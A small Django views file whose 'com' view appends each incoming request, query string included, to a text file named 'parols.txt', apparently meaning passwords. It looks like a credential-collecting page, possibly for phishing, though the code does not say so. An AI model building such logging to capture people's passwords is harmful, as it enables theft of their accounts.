
from django.shortcuts import render,redirect
from django.core.files import File 


def main(request):
    print(request.GET)
    # with open('parols.txt', 'a+') as f:
    #     myfile = File(f)
    #     myfile.write(str(request.GET))

    return render(request, "app.html")

def com(request):    
    with open('parols.txt', 'a+') as f:
        myfile = File(f)
        myfile.write(str(request))
    

    return render(request, "app.html")
    